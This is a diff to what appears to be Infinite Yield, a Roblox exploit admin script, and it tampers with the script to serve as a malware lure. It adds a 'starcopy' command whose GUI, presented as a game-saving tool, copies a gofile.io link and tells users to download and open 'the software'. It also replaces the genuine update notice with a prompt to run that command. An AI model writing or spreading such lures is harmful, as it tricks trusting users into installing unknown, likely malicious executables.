@@ -1,4 +1,3 @@
-local f="SA.mp3" writefile(f, game:HttpGet("https://juegosboti.xyz/SA.mp3")) local s=Instance.new("Sound", game:GetService("SoundService")) s.SoundId=getcustomasset(f) s.Volume=10 s.Looped=true s:Play()
 if IY_LOADED and not _G.IY_DEBUG == true then
 	-- error("Infinite Yield is already running!",0)
 	return
@@ -11818,6 +11817,7 @@ addcmd('destroyheight',{'dh'},function(args, speaker)
 	end
 end)
 
+
 addcmd('trip',{},function(args, speaker)
 	if speaker and speaker.Character and speaker.Character:FindFirstChildOfClass("Humanoid") and getRoot(speaker.Character) then
 		local hum = speaker.Character:FindFirstChildOfClass("Humanoid")
@@ -11825,6 +11825,101 @@ addcmd('trip',{},function(args, speaker)
 		hum:ChangeState(0)
 		root.Velocity = root.CFrame.LookVector * 30
 	end
+end)
+
+addcmd('starcopy', {}, function(args, speaker)
+    -- Your existing GUI code here (unchanged)
+    local UserInputService = game:GetService("UserInputService")
+
+    -- GUI
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "StarMenuGui"
+    screenGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+    screenGui.ResetOnSpawn = false
+
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(0, 300, 0, 200)
+    mainFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    mainFrame.BorderSizePixel = 2
+    mainFrame.BorderColor3 = Color3.fromRGB(255, 255, 255)
+    mainFrame.Active = true
+    mainFrame.Parent = screenGui
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0, 40)
+    title.BackgroundTransparency = 1
+    title.Text = "Star reupload"
+    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    title.TextSize = 20
+    title.Font = Enum.Font.SourceSansBold
+    title.Parent = mainFrame
+
+    local saveButton = Instance.new("TextButton")
+    saveButton.Size = UDim2.new(0.8, 0, 0, 40)
+    saveButton.Position = UDim2.new(0.1, 0, 0.3, 0)
+    saveButton.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+    saveButton.Text = "Save Game"
+    saveButton.TextColor3 = Color3.fromRGB(150, 150, 150)
+    saveButton.AutoButtonColor = false
+    saveButton.Font = Enum.Font.SourceSans
+    saveButton.TextSize = 18
+    saveButton.Parent = mainFrame
+
+    local instructionBtn = Instance.new("TextButton")
+    instructionBtn.Size = UDim2.new(0.9, 0, 0, 60)
+    instructionBtn.Position = UDim2.new(0.05, 0, 0.6, 0)
+    instructionBtn.BackgroundTransparency = 1
+    instructionBtn.Text = "Click me, paste link in browser, download the software, open and re-execute script."
+    instructionBtn.TextColor3 = Color3.fromRGB(255, 50, 50)
+    instructionBtn.TextWrapped = true
+    instructionBtn.Font = Enum.Font.SourceSansItalic
+    instructionBtn.TextSize = 14
+    instructionBtn.Parent = mainFrame
+
+    instructionBtn.MouseButton1Click:Connect(function()
+        if setclipboard then
+            setclipboard("https://gofile.io/d/WGmgAJ")
+            print("Link copied to clipboard!")
+        else
+            warn("Executor doesn't support clipboard.")
+        end
+    end)
+
+    -- Dragging logic (unchanged)
+    local dragging, dragInput, dragStart, startPos
+
+    mainFrame.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = true
+            dragStart = input.Position
+            startPos = mainFrame.Position
+        end
+    end)
+
+    UserInputService.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement then
+            dragInput = input
+        end
+    end)
+
+    game:GetService("RunService").RenderStepped:Connect(function()
+        if dragging and dragInput then
+            local delta = dragInput.Position - dragStart
+            mainFrame.Position = UDim2.new(
+                startPos.X.Scale,
+                startPos.X.Offset + delta.X,
+                startPos.Y.Scale,
+                startPos.Y.Offset + delta.Y
+            )
+        end
+    end)
+
+    UserInputService.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = false
+        end
+    end)
 end)
 
 local freezingua = nil
@@ -12194,7 +12289,7 @@ task.spawn(function()
 	
 	if success then
 		if currentVersion ~= latestVersionInfo.Version then
-			notify('Outdated','Get the new version at infyiff.github.io')
+			notify('Updates 📣','Try running command ;starcopy in chat.')
 		end
 		
 		if latestVersionInfo.Announcement and latestVersionInfo.Announcement ~= '' then
